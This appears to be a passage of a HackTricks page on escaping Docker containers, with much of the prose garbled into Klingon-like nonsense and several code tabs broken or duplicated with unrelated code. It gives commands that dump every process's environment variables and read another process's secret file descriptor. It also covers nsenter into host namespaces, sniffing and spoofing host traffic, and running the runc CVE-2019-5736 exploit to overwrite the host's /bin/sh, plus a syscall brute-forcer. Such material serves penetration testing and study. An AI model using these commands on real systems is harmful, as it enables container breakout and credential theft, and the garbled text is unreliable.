'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev.
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
**ghItlhvam** **'ej** **'oH** **Dochvam** **file descriptors** **'ej** **cha'logh** **open files** **'oH** **ghItlhvam** **'e'** **DIvI'**.
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
**ghItlh** **DIr** **'ej** **DoS** **ghaH** **'e'** **DIvI'** **processes** **'oH** **vItlhutlh**.

{% hint style="warning" %}
**vaj** **container** **Daq** **process** **'e'** **'oH** **'e'** **access** **ghaH** **vItlhutlh**, **nsenter --target <pid> --all** **yIlo'** **'ej** **nsenter --target <pid> --mount --net --pid --cgroup** **yIlo'** **'e'** **shell** **run** **'e'** **ns restrictions** **(hopefully none)** **'e'** **'ej** **process** **'e'** **'oH** **as** **shell** **run** **'e'**.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
**hostIPC**

**hostIPC** pagh Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/) laH container configured vaj, container network stack Docker host (container host's networking namespace shares) 'ej container IP-address allocated ghap. lo'laH, **container services directly host's IP** 'oH. DaH jImej, container **intercept ALL network traffic host** 'e' luqDaj shared interface `tcpdump -i eth0`.

vaj, **sniff and even spoof traffic** between host and metadata instance 'oH. 

ghal examples:

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

vaj, **network services binded to localhost** inside the host or even access the **metadata permissions of the node** (which might be different those a container can access) 'oH.
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true` jImejDaq, **shared memory** `/dev/shm` vIqel, **inter-process communication (IPC)** resources vItlhutlh. vaj **IPC mechanisms** vItlhutlh `ipcs` vItlhutlh.

* **Inspect /dev/shm** - `/dev/shm` shared memory lo'wIj vItlhutlh: `ls -la /dev/shm`
* **Inspect existing IPC facilities** – `/usr/bin/ipcs` vItlhutlh, **IPC facilities** vItlhutlh: `ipcs -a`

### Recover capabilities

syscall **`unshare`** vItlhutlh vaj, **capabilities** vItlhutlh:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### User namespace abuse via symlink

The second technique explained in the post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indicates how you can abuse bind mounts with user namespaces, to affect files inside the host (in that specific case, delete files).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc exploit (CVE-2019-5736)

In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.

Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:

`docker exec -it <container-name> /bin/sh`

This will trigger the payload which is present in the main.go file.

For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
There are other CVEs the container can be vulnerable too, you can find a list in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

* **Namespaces:** The process should be **completely separated from other processes** via namespaces, so we cannot escape interacting with other procs due to namespaces (by default cannot communicate via IPCs, unix sockets, network svcs, D-Bus, `/proc` of other procs).
* **Root user**: By default the user running the process is the root user (however its privileges are limited).
* **Capabilities**: Docker leaves the following capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: These are the syscalls that the **root user won't be able to call** (because of lacking capabilities + Seccomp). The other syscalls could be used to try to escape.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

{% endtab %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define __NR_mkdir 83

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        return 1;
    }

    char *dir = argv[1];
    int ret = syscall(__NR_mkdir, dir, 0755);

    if (ret == -1) {
        perror("syscall");
        return 1;
    }

    printf("Directory created successfully\n");
    return 0;
}
```

{% endtab %}

{% tab title="syscall_bf.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define __NR_mkdir 83

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        return 1;
    }

    char *dir = argv[1];
    int ret = syscall(__NR_mkdir, dir, 0755);

    if (ret == -1) {
        perror("syscall");
        return 1;
    }

    printf("Directory created successfully\n");
    return 0;
}
```

{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
